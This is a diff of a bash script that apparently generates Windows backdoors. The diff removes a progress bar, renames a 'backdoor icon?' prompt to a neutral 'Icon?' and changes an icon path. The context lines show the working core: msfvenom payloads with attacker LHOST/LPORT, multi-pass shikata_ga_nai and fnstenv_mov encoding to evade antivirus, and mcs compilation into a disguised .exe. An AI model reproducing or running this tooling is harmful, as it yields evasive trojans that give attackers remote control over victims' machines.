@@ -29,16 +29,6 @@ mkdir $dir/output
 mkdir $dir/source
 mkdir $dir/handler
 
-bar ()
-{
-BAR='<*******************************************>'    
-                         
-for i in {1..35}; do
-    echo -ne "\r${BAR:0:$i}" 
-    sleep 0.03
-done
-}
-
 # check msfconsole
 which msfconsole > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
@@ -229,7 +219,7 @@ fi
 esac
 
 #ikonoa
-echo -e "\e[0;31mbackdoor icon? y or n\e[0m =>  \c"
+echo -e "\e[0;31mIcon? y or n\e[0m =>  \c"
 read icon
 if [[ $icon != "y" && $icon != "n" ]]; then 
 echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
@@ -257,7 +247,6 @@ echo -e "\e[0;31mEnter file name\e[0m =>  \c"
 read izena
 echo ""
 echo -e "\e[0;31mPlease wait\e[0m"
-bar
 if [ "$option" == "7" ]; then
 msfvenom -p $payload LHOST=$ip LPORT=$port --platform windows -a x86 -e generic/none 2>/dev/null | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -i $int -f raw 2>/dev/null | msfvenom --platform windows -a x86 -e x86/fnstenv_mov -i $int -f hex >> behinbehineko 2>/dev/null;
 encoded='Y'
@@ -327,13 +316,13 @@ echo "}}}}" >> Kodea
 
 #kompilatu
 if [ "$icon" == "y" ] && [ "$error" == "n" ]; then 
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/Zcat.ico -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/icon.ico -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
 mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
 mcs -platform:x86 -unsafe Kodea -out:$dir/output/$izena.exe
 elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/Zcat.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/icon.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 fi
 
 #aldaketa
